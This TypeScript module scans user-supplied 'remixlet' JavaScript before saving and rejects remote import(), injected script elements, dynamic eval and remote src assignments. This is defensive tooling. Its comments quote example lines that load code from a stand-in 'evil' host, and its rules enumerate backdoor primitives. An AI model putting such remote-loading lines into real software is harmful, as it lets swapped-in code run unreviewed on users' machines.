// Deterministic pre-activation review for the remote-code-loading failure
// mode the world CSP contains at runtime (H1). A world CSP of
// `script-src 'self'` already blocks a remote `<script>`/import at execution
// time, but catching the pattern at the WRITE boundary keeps the stored,
// "small and inspectable" artifact honest — a remixlet that tries to fetch and
// run code it can swap later is refused before it is ever saved.
//
// Runs after Prettier has proved each JavaScript file parses, before anything
// is saved, registered, approved, or reloaded. It reuses the Babel parser
// already shipped with Prettier rather than adding a second parser to the
// bundle, and walks the AST — never a substring scan a comment or string
// could trip.

import * as pluginBabel from "prettier/plugins/babel";
import type { RemixletFile } from "./format.js";

type AstScalar = string | number | boolean | null;

interface AstNode {
  type: string;
  loc?: { start?: { line?: number } };
  name?: string;
  value?: AstScalar | { cooked?: string | null };
  callee?: AstNode;
  property?: AstNode;
  object?: AstNode;
  left?: AstNode;
  right?: AstNode;
  source?: AstNode;
  arguments?: AstNode[];
  expressions?: AstNode[];
  quasis?: AstNode[];
  program?: AstNode;
  [key: string]: AstNode | AstNode[] | AstScalar | { cooked?: string | null } | { start?: { line?: number } } | undefined;
}

interface RemoteCodeFinding {
  path: string;
  line: number;
  message: string;
}

function isNode(value: AstNode | AstNode[] | AstScalar | { cooked?: string | null } | { start?: { line?: number } } | undefined): value is AstNode {
  return value instanceof Object && "type" in value;
}

function isAstString(value: AstScalar | { cooked?: string | null } | undefined): value is string {
  return Object.prototype.toString.call(value) === "[object String]";
}

function childNodes(node: AstNode): AstNode[] {
  const children: AstNode[] = [];
  for (const [key, value] of Object.entries(node)) {
    if (key === "loc" || key === "start" || key === "end" || key === "tokens" || key === "comments") continue;
    if (isNode(value)) children.push(value);
    else if (Array.isArray(value)) {
      for (const item of value) if (isNode(item)) children.push(item);
    }
  }
  return children;
}

function walk(node: AstNode, visit: (node: AstNode) => void): void {
  visit(node);
  for (const child of childNodes(node)) walk(child, visit);
}

function propertyName(node: AstNode | undefined): string | undefined {
  if (!node) return undefined;
  if (node.type === "Identifier") return node.name;
  if (node.type === "StringLiteral" && isAstString(node.value)) return node.value;
  return undefined;
}

function memberProperty(node: AstNode | undefined): string | undefined {
  if (!node || (node.type !== "MemberExpression" && node.type !== "OptionalMemberExpression")) return undefined;
  return propertyName(isNode(node.property) ? node.property : undefined);
}

function calleeName(node: AstNode | undefined): string | undefined {
  if (!node) return undefined;
  if (node.type === "Identifier") return node.name;
  return memberProperty(node);
}

/**
 * The string literal a node evaluates to, if statically known — a plain string
 * literal or a template literal with no interpolations. `undefined` for
 * anything dynamic (a variable, a concatenation, an interpolated template).
 */
function staticString(node: AstNode | undefined): string | undefined {
  if (!node) return undefined;
  if (node.type === "StringLiteral" && isAstString(node.value)) return node.value;
  if (node.type === "TemplateLiteral" && Array.isArray(node.expressions) && node.expressions.length === 0) {
    const quasis = Array.isArray(node.quasis) ? node.quasis : [];
    const cooked = quasis
      .map((q) => (isNode(q) && q.value !== null && q.value instanceof Object && "cooked" in q.value ? q.value.cooked ?? "" : ""))
      .join("");
    return cooked;
  }
  return undefined;
}

/** A remote URL if the value is a KNOWN remote string, or `true` when the value is dynamic. */
function isRemoteOrDynamic(node: AstNode | undefined): "remote" | "dynamic" | undefined {
  const literal = staticString(node);
  if (literal === undefined) {
    // A non-literal src/import target could be anything, including a remote URL
    // built at runtime — the exact shape a live-updating backdoor uses.
    return node === undefined ? undefined : "dynamic";
  }
  return /^(https?:)?\/\//i.test(literal.trim()) ? "remote" : undefined;
}

function reviewFile(program: AstNode, path: string): RemoteCodeFinding[] {
  const findings: RemoteCodeFinding[] = [];
  const add = (node: AstNode, message: string) => findings.push({ path, line: node.loc?.start?.line ?? 1, message });

  walk(program, (node) => {
    // 1. Dynamic import of a remote URL: `import("https://evil/x.js")`.
    if (
      (node.type === "CallExpression" || node.type === "OptionalCallExpression") &&
      isNode(node.callee) &&
      node.callee.type === "Import"
    ) {
      const arg = Array.isArray(node.arguments) ? node.arguments.find(isNode) : undefined;
      const remote = isRemoteOrDynamic(arg);
      if (remote === "remote") {
        add(node, "loads code from a remote URL with import(). A remixlet must ship its code, not fetch it at runtime.");
      }
    }
    // Some Babel/ESTree builds model dynamic import as ImportExpression.
    if (node.type === "ImportExpression") {
      const source = isNode(node.source) ? node.source : undefined;
      if (isRemoteOrDynamic(source) === "remote") {
        add(node, "loads code from a remote URL with import(). A remixlet must ship its code, not fetch it at runtime.");
      }
    }

    // 2. Building a <script> element in page/remixlet code — the exact backdoor
    //    primitive. `document.createElement("script")`.
    if (node.type === "CallExpression" || node.type === "OptionalCallExpression") {
      const callee = isNode(node.callee) ? node.callee : undefined;
      if (memberProperty(callee) === "createElement") {
        const arg = Array.isArray(node.arguments) ? node.arguments.find(isNode) : undefined;
        if (staticString(arg)?.toLowerCase() === "script") {
          add(node, "creates a <script> element. A remixlet cannot inject scripts — that would let it run code it did not ship.");
        }
      }
      // 3. eval() of anything but a plain string literal — i.e. eval of fetched
      //    or otherwise dynamic text.
      if (calleeName(callee) === "eval") {
        const arg = Array.isArray(node.arguments) ? node.arguments.find(isNode) : undefined;
        if (arg && staticString(arg) === undefined) {
          add(node, "calls eval() on a value computed at runtime. Fetched or dynamic text must never be evaluated as code.");
        }
      }
    }

    // 4. Assigning a remote/dynamic URL to a `.src` property — a script (or
    //    other) element pointed at remote code: `el.src = "https://evil/x.js"`.
    if (node.type === "AssignmentExpression" && node.operator === "=" && isNode(node.left) && memberProperty(node.left) === "src") {
      if (isRemoteOrDynamic(isNode(node.right) ? node.right : undefined) === "remote") {
        add(node, "points an element's src at a remote URL. A remixlet must not load remote resources it could swap for code later.");
      }
    }
  });

  return findings;
}

async function findRemoteCodeLoading(file: RemixletFile): Promise<RemoteCodeFinding[]> {
  if (!file.path.endsWith(".js") && !file.path.endsWith(".mjs")) return [];
  const parser = pluginBabel.parsers.babel;
  if (!parser) throw new Error("The bundled JavaScript parser is unavailable; nothing was saved or activated.");
  // Prettier exposes a smaller runtime parser surface than its ParserOptions
  // type suggests. filepath is the only option Babel needs here.
  // SAFETY: Prettier's Babel parser accepts filepath although its public parser type omits that runtime option.
  const parsed = await parser.parse(file.content, { filepath: file.path } as never);
  if (!isNode(parsed)) {
    throw new Error(`${file.path}: JavaScript review could not read the parsed file; nothing was saved or activated.`);
  }
  const program = parsed.type === "File" && isNode(parsed.program) ? parsed.program : parsed;
  return reviewFile(program, file.path);
}

/** Reject remote-code-loading remixlets before the activation pipeline has any side effect. */
export async function assertNoRemoteCodeLoading(files: readonly RemixletFile[]): Promise<void> {
  const findings = (await Promise.all(files.map((file) => findRemoteCodeLoading(file)))).flat();
  if (findings.length === 0) return;
  const lines = findings.map((finding) => `${finding.path}:${finding.line}: ${finding.message}`);
  throw new Error(`Pre-activation remote-code review failed; nothing was saved or activated.\n${lines.join("\n")}`);
}
